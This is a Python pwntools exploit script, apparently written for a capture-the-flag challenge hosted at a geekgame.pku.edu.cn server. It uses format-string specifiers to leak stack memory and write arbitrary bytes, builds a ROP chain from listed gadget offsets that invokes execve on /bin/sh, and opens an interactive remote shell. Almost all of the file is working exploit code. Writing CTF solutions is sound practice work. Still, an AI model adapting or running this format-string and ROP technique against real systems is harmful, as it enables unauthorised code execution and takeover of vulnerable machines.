import subprocess
from pwn import *


def read_arg(arg):
    payload = f"%{arg}$016llx".encode("ascii")
    conn.send(payload + b"\n")
    line = conn.recvline()
    conn.recvuntil(b"Please input your instruction:\n")
    line = line.strip().decode()
    print(line)
    return bytes.fromhex(line)


def read_u64(base_addr, addr):
    offset = addr - base_addr
    assert offset % 8 == 0, offset
    assert offset >= 0, offset

    BASE_ARG = 18
    arg = BASE_ARG + offset // 8

    print(f"{arg = }")
    return read_arg(arg)


def get_data(start=1, end=256, conn=None, data=None):
    assert data is not None
    assert conn is not None
    step = 16
    for i in range(start, end, step):
        conn.send(b" ".join(b"%%%d$016llx" % i for i in range(i, i+step)))
        conn.send(b"\n")
        r = conn.recvline()
        conn.recvuntil(b"Please input your instruction:\n")
        hexdata = r.splitlines()[0].decode()
        for d in hexdata.split():
            data.extend(bytes.fromhex(d)[::-1])


def xxd_data(data, publics_ptr=None):
    if publics_ptr is None:
        cmd = ["xxd"]
    else:
        offset = publics_ptr - 0x88
        cmd = ["xxd", "-o", str(offset)]
    return subprocess.run(cmd, input=data)


def build_rop(orig_ret_addr, bin_sh_ptr):
    # $ objdump -d pwn | grep -A 2 '<test>$'
    # a3f8:       e8 3c fd ff ff          call   a139 <test>
    # a3fd:       b8 00 00 00 00          mov    $0x0,%eax
    # a402:       5d                      pop    %rbp
    orig_ret_addr_elf = 0xa3fd
    # $ ROPgadget --binary pwn --only 'pop|ret' | grep rax
    # 0x000000000008d9da : pop rax ; pop rdx ; pop rbx ; ret
    # 0x000000000005a777 : pop rax ; ret
    rax_gadget_elf = 0x5a777
    # $ ROPgadget --binary pwn --only 'pop|ret' | grep -E 'rdi|rsi|rdx'
    # 0x000000000008d9da : pop rax ; pop rdx ; pop rbx ; ret
    # 0x000000000000bb1b : pop rdi ; pop rbp ; ret
    # 0x0000000000009cd2 : pop rdi ; ret
    # 0x000000000008d9db : pop rdx ; pop rbx ; ret
    # 0x0000000000009bdf : pop rdx ; ret
    # 0x000000000000bb19 : pop rsi ; pop r15 ; pop rbp ; ret
    # 0x0000000000009cd0 : pop rsi ; pop r15 ; ret
    # 0x000000000001781e : pop rsi ; ret
    rdi_gadget_elf = 0x9cd2
    rsi_gadget_elf = 0x1781e
    rdx_gadget_elf = 0x9bdf
    # $ ROPgadget --binary pwn --only 'syscall' | grep syscall
    # 0x0000000000009643 : syscall
    #syscall_elf = 0x9643
    # $ objdump -d pwn | less
    # search syscall
    syscall_elf = 0x20b1d

    rax_gadget = rax_gadget_elf - orig_ret_addr_elf + orig_ret_addr
    rdi_gadget = rdi_gadget_elf - orig_ret_addr_elf + orig_ret_addr
    rsi_gadget = rsi_gadget_elf - orig_ret_addr_elf + orig_ret_addr
    rdx_gadget = rdx_gadget_elf - orig_ret_addr_elf + orig_ret_addr
    syscall = syscall_elf - orig_ret_addr_elf + orig_ret_addr

    return [rax_gadget, 59, rdi_gadget, bin_sh_ptr, rsi_gadget, 0, rdx_gadget, 0, syscall]


def write_byte(addr, value):
    assert value in range(256)
    payload = b" " * value
    # 34 + (256 + 8) // 8 == 67
    payload += b"%67$hhn\0"
    assert len(payload) <= 256 + 8
    payload += b"\0" * (256 + 8 - len(payload))
    assert len(payload) == 256 + 8
    payload += addr.to_bytes(8, "little")

    conn.send(payload + b"\n")
    #print(conn.recvline())
    #print(f"write {value:#x} to {addr:#x}")
    conn.recvuntil(b"Please input your instruction:\n")


def write_ptr(addr, ptr: int):
    for b_addr, value in zip(range(addr, addr+8), ptr.to_bytes(8, "little")):
        write_byte(b_addr, value)
    print(f"write {ptr:#x} to {addr:#x}")


def main():
    global conn
    conn = remote("prob09.geekgame.pku.edu.cn", 10009)
    conn.interactive()
    conn.send(b"%llx\n")
    publics_ptr = int(conn.recvline().strip().decode(), base=16)
    conn.recvuntil(b"Please input your instruction:\n")

    conn.send(b"?" * 1021 + b"\n")
    conn.recvuntil(b"Please input your instruction:\n")

    data = bytearray()
    get_data(conn=conn, data=data)
    xxd_data(data, publics_ptr)
    print(f"{publics_ptr = :#x}")

    orig_ret_addr = int.from_bytes(read_arg(165), "big")
    print(f"{orig_ret_addr = :#x}")

    start_write_addr = publics_ptr + 0x7ffed52b45f8 - 0x7ffed52b4160
    print(f"{start_write_addr = :#x}")

    bin_sh_offset = 16*8 + 4
    rop = build_rop(orig_ret_addr, publics_ptr + bin_sh_offset)

    for addr, ptr in zip(range(start_write_addr, start_write_addr + 9999, 8), rop):
        write_ptr(addr, ptr)

    data = bytearray()
    get_data(conn=conn, data=data)
    xxd_data(data, publics_ptr)

    conn.send(b"exit/bin/bash\0\n")
    conn.interactive()


if __name__ == "__main__":
    main()
